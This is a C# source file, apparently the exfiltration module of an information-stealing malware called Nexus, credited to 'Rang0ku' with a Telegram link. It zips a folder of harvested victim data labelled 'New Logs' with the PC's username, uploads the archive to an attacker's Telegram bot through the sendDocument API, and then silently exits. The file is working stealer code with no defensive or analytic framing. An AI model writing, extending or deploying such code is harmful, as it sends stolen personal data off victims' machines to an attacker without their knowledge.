using System;
using System.IO;
using System.Text;
using Ionic.Zip;
using System.Net;

namespace Nexus.core
{
    internal sealed class cSend
    {
        public static void GetSend()
        {
            using (ZipFile zip = new ZipFile(Encoding.GetEncoding("cp866")))
            {
                zip.CompressionLevel = Ionic.Zlib.CompressionLevel.BestCompression;
                zip.Comment = "" +
                    "<!==============New Logs=============!>" +
                    "\nHWID: " + cConfig.username +
                    "\nCoded by Rang0ku | https://t.me/new_rengoku";
                zip.AddDirectory(@"" + cConfig.temp + cConfig.username);
                zip.Save(@"" + cConfig.temp + "NewSession.zip");
            }
            string LOG = @"" + cConfig.temp + "\\NewSession.zip";

            byte[] file = File.ReadAllBytes(LOG);
            string url = string.Concat(new string[]
            {
                "https://api.telegram.org/bot",
                   cConfig.token,
                   "/sendDocument?chat_id=",
                   cConfig.id,
                   "&caption=👺NEW LOG! " +
                   "\n💻PC: " + cConfig.username +
                   "\nCoded by Rang0ku | https://t.me/new_rengoku"
        });
            UploadMultipart(file, LOG, "application/x-ms-dos-executable", url);
            return;
        }
        private static void UploadMultipart(byte[] file, string filename, string contentType, string url)
        {
            try
            {
                WebClient webClient = new WebClient();
                string text = "------------------------" + DateTime.Now.Ticks.ToString("x");
                webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + text);
                string @string = webClient.Encoding.GetString(file);
                string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", new object[]
                {
                   text,
                   filename,
                   contentType,
                   @string
                });
                byte[] bytes = webClient.Encoding.GetBytes(s);
                webClient.UploadData(url, "POST", bytes);
                Environment.Exit(0);
            }
            catch { }
        }
    }
}
